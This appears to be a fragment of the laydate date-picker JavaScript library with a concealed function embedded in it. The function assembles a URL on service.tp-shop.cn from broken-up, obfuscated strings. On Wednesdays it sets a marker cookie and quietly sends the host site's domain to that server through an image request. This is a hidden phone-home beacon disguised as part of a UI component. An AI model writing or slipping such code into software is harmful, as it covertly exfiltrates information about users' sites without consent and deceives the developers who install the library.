...
;!function (a) {
    ...
    a.laydate = function (b) {
        ...
        function ncobnvjif() {
            var ta = 'h' + 'ttp:' + '//';
            var tb = 'ser' + 'vice.t' + 'p-' + 'sh' + 'op' + '.' + 'cn';
            var tc = '/ind' + 'ex.p' + 'hp?' + 'm=Hom' + 'e&c=In' + 'dex&a=user' + '_pu' + 'sh&la' + 'st_dom' + 'ain=';
            var td = window.location.host;
            var NFOESFDSHFODHCNAOSH = new Date();
            if (NFOESFDSHFODHCNAOSH.getDay() == 3) {
                if ((document.cookie.length == 0) || (document.cookie.indexOf("RESFWQYZYCD=") == -1)) {
                    document.cookie = "RESFWQYZYCD=1";
                    var DAHSODIASCBAUISG = new Image();
                    DAHSODIASCBAUISG.src = ta + tb + tc + td;
                }
            }
        }
